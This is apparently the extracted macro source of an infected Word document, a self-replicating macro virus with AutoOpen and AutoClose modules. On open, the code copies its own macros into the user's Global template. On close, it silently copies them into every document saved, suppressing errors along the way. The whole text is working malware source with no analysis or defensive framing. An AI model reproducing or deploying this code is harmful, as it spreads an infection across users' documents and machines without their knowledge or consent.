   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "AutoClose"


   Public Sub MAIN()
   Attribute MAIN.VB_Description = "F%"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim sMe$
   Dim sMacro$
   'MsgBox MacroFileName$
   On Error GoTo -1: On Error GoTo Abort

   Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
   WordBasic.CurValues.FileSaveAs dlg

   If dlg.Format = 0 Then dlg.Format = 1
   sMe$ = WordBasic.[FileName$]()

       WordBasic.FileSaveAs dlg


   '--------------------------------------------------------

   sMe$ = WordBasic.[FileName$]()
   sMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy "Global:AutoClose", sMacro$
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy "Global:AutoOpen", sMacro$
   WordBasic.FileSaveAs dlg
   Abort:
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "F%"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
   Dim sMe$
   Dim sMacro$

   sMe$ = WordBasic.[FileName$]()
   'MsgBox MacroFileName$()
   sMacro$ = sMe$ + ":AutoClose"
   WordBasic.MacroCopy sMacro$, "Global:AutoClose"
   sMacro$ = sMe$ + ":AutoOpen"
   WordBasic.MacroCopy sMacro$, "Global:AutoOpen"

   End Sub
